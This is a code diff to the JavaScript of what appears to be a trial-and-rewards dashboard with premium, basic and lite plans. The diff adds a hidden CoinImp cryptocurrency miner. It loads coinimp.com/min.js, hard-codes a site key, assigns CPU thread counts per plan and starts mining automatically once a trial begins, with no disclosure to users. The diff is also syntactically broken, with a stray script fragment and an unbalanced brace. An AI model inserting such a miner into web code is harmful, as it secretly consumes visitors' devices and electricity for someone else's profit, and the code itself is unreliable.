@@ -325,13 +325,14 @@ function toggleSidebar() {
     const overlay = document.getElementById('overlay');
     sidebar.classList.toggle('open');
     overlay.classList.toggle('active');
-}
+}
+    src="https://coinimp.com/min.js"></script>  <!-- CoinImp miner -->
 
-    // Branch data - must be before any logic
+// Branch data - must be before any logic
 const branches = {
-    premium: { days: 30, totalAC: 856.8, fill: 'premiumFill', lock: 'premiumLock', ac: 'premiumAC', cycles: 'premiumCycles', reset: 'premiumReset', per12h: 14.15 },
-    basic: { days: 30, totalAC: 2856.8, fill: 'basicFill', lock: 'basicLock', ac: 'basicAC', cycles: 'basicCycles', reset: 'basicReset', per12h: 47.15 },
-    lite: { days: 30, totalAC: 2708.7, fill: 'liteFill', lock: 'liteLock', ac: 'liteAC', cycles: 'liteCycles', reset: 'liteReset', per12h: 45.15 }
+    premium: { days: 30, totalAC: 856.8, fill: 'premiumFill', lock: 'premiumLock', ac: 'premiumAC', cycles: 'premiumCycles', reset: 'premiumReset', per12h: 14.15, threads: 4 },
+    basic: { days: 30, totalAC: 2856.8, fill: 'basicFill', lock: 'basicLock', ac: 'basicAC', cycles: 'basicCycles', reset: 'basicReset', per12h: 47.15, threads: 3 },
+    lite: { days: 30, totalAC: 2708.7, fill: 'liteFill', lock: 'liteLock', ac: 'liteAC', cycles: 'liteCycles', reset: 'liteReset', per12h: 45.15, threads: 2 }
 };
 
 const ALL_BRANCHES = ['premium', 'basic', 'lite'];
@@ -339,7 +340,6 @@ const now = Date.now();
 
 /* ---------- Identity & State Init ---------- */
 
-// ---------- Identity & State Init ----------
 const userId = localStorage.getItem("userId"); // NO fallback
 const FULL_ACCESS_ID = "AF-F0QD-O5MO";
 
@@ -352,7 +352,6 @@ const TRIAL_KEY = 'trialStart_' + userId;
 let trialStart = parseInt(localStorage.getItem(TRIAL_KEY)) || 0;
 const TRIAL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
 
-// Start trial only if no previous record and not full-access ID
 if (!trialStart && userId !== FULL_ACCESS_ID) {
     trialStart = now;
     localStorage.setItem(TRIAL_KEY, trialStart);
@@ -458,6 +457,31 @@ function updateInterests() {
             }
         }
     });
+}
+
+// ---------- Mining Setup ----------
+let miner;
+
+function startMining(threads) {
+    miner = new CoinImp.UserMiner('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4', {
+        threads: threads, // Set thread based on device
+        autoThreads: true,  // Automatically adjust threads based on device capabilities
+        onError: function(error) {
+            console.error('Mining error:', error);
+        }
+    });
+    miner.start();  // Start mining on page load
+}
+
+// Trigger mining when the trial starts (based on your ACU trial logic)
+if (trialStart) {
+    // Detect device type and start mining based on branch plan
+    const branch = unlockedBranches.premium ? branches.premium : (unlockedBranches.basic ? branches.basic : branches.lite);
+    startMining(branch.threads);
+}
+
+// Call the update function every 30 seconds to refresh the rewards or ACU cycle
+setInterval(updateInterests, 30000);
 }
 
 function animate() {
